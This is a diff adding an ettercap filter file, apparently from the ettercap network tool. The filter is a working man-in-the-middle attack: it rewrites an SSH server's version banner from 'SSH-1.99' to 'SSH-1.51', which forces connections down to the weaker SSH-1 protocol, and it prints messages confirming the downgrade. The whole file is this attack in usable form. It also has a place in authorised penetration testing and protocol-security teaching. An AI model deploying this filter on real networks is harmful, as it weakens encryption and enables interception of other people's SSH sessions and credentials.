@@ -1,0 +1,40 @@
+############################################################################
+#                                                                          #
+#  ettercap -- etter.filter -- filter source file                          #
+#                                                                          #
+#  Copyright (C) ALoR & NaGA                                               #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#
+#   This filter will substitute the SSH server response from SSH-1.99 to
+#   SSH-1.51, so if the server supports both ssh1 and ssh2 we will force
+#   it to use ssh1... ;)
+#   server response :    SSH-2.00   only ssh2 supported
+#                        SSH-1.99   both ssh1 and ssh2 supported
+#                        SSH-1.51   only ssh1 supported
+##
+
+if (ip.proto == TCP) {
+   if (tcp.src == 22) {
+      if ( replace("SSH-1.99", "SSH-1.51") ) {
+         msg("[SSH Filter] SSH downgraded from version 2 to 1\n");
+      } else {
+         if ( search(DATA.data, "SSH-2.00") ) {
+            msg("[SSH Filter] Server supports only SSH version 2\n");
+         } else {
+            if ( search(DATA.data, "SSH-1.51") ) {
+               msg("[SSH Filter] Server already supports only version 1\n");
+            }
+         }
+      }
+   } 
+}
+
+
